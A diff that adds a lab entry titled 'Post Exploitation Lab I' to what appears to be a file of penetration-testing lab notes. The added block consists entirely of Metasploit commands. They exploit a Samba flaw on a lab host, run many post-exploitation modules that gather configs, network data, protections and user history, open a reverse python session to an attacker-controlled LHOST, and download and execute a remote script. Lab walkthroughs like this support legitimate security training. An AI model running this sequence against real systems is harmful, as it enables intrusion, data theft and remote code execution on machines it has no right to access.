@@ -1470,7 +1470,49 @@ type flag.txt
 search ssh  platform:linux
 ```
 
+76)  Post Exploitation Lab I
 
+```
+nmap -sS -sV -p- 192.162.5.3
+use exploit/linux/samba/is_known_pipename
+set RHOST 192.162.5.3
+check
+exploit -z
+use post/linux/gather/enum_configs
+set SESSION 1
+run
+use post/multi/gather/env
+set SESSION 1
+run
+use post/linux/gather/enum_network
+set SESSION 1
+run
+use post/linux/gather/enum_protections
+set SESSION 1
+run
+use post/linux/gather/enum_system
+set SESSION 1
+run
+use post/linux/gather/checkcontainer
+set SESSION 1
+run
+use post/linux/gather/checkvm
+set SESSION 1
+run
+use post/linux/gather/enum_users_history
+set SESSION 1
+run
+use post/multi/manage/system_session
+set SESSION 1
+set TYPE python
+set HANDLER true
+set LHOST 192.162.5.2
+run
+use post/linux/manage/download_exec
+set URL http://192.162.5.2/test.sh
+set SESSION 1
+run
+```
 
 
 
